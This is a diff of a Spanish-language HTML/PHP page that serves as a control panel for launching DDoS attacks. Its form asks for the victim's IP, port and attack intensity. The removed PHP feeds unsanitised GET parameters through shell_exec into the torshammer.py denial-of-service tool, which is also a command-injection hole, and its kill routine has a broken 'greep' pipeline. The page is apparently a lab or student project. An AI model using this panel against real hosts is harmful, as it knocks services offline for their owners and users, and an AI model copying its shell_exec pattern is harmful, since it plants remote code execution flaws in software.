@@ -8,15 +8,29 @@
   </head>
   <body>
     <menu></menu>
+    <div class="formularios" id="F-DDOS" style="display: none;">
+      <form id="DDOS-form" action="scripts.php" method="post" onsubmit="return fetchcall();">
+        <input type="hidden" name="DDOS" value="1">
+        <p>Escribe la IP de la victima.</p>
+        <input type="text" name="IP" placeholder="192.168.214.100">
+        <br>
+        <p>Escribe el puerto que usa el servicio que quieres denegar.</p>
+        <input type="text" name="PORT" placeholder="80">
+        <br>
+        <p>Escribe la redundancia que tendra el ataque.</p>
+        <input type="text" name="RE" placeholder="512">
+        <br>
+        <button type="submit" name="button">Enviar</button>
+      </form>
+    </div>
     <div id="ataques">
       <div class="ataques">
         <h2>DDOS</h2>
         <p>Un ataque DDoS, o ataque distribuido de denegación de servicio, es un tipo de ciberataque que intenta hacer que un sitio web o recurso de red no esté disponible colapsándolo con tráfico malintencionado para que no pueda funcionar correctamente.</p>
-        <div class="boton">
+        <form class="boton" id="kill" action="scripts.php" method="post">
           <button id="DDOS" type="button" name="button">Atacar</button>
-          <button type="button" name="stop">Parar ataque</button>
-
-        </div>
+          <button type="submit" name="DDOS-stop">Parar ataque</button>
+        </form>
       </div>
       <div class="ataques">
         <h2>DOS</h2>
@@ -39,46 +53,8 @@
       <div class="ataques">
       </div>
     </div>
-    <div class="formularios hidden" id="F-DDOS">
-      <form action="" method="get">
-        <p>Escribe la IP de la victima.</p>
-        <input type="text" name="IP" placeholder="192.168.214.100">
-        <br>
-        <p>Escribe el puerto que usa el servicio que quieres denegar.</p>
-        <input type="text" name="PORT" placeholder="80">
-        <br>
-        <p>Escribe la redundancia que tendra el ataque.</p>
-        <input type="text" name="RE" placeholder="512">
-        <br>
-        <button type="submit" name="button">Enviar</button>
-      </form>
-    </div>
     <footer></footer>
-    <?php
-
-      // Use ls command to shell_exec
-      // function
-      $output = 'python2 scripts/ThorHammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE'];
-      if ($_GET['button'])
-      {
-        // $output = "ls";
-        shell_exec($output);
-        print_r(shell_exec($output));
-      }
-      echo "<br>";
-      if($_GET['stop'])
-        {
-          func();
-        }
-      function func()
-        {
-          $PID = shell_exec('ps -e | greep python2 | cut -b 1-8 -b');
-          $matar = shell_exec(`kill $PID`);
-        }
-
-      print_r($output);
-
-    ?>
   </body>
   <script type="text/javascript" src="main.js"></script>
+  <script type="text/javascript" src="atacks.js"></script>
 </html>
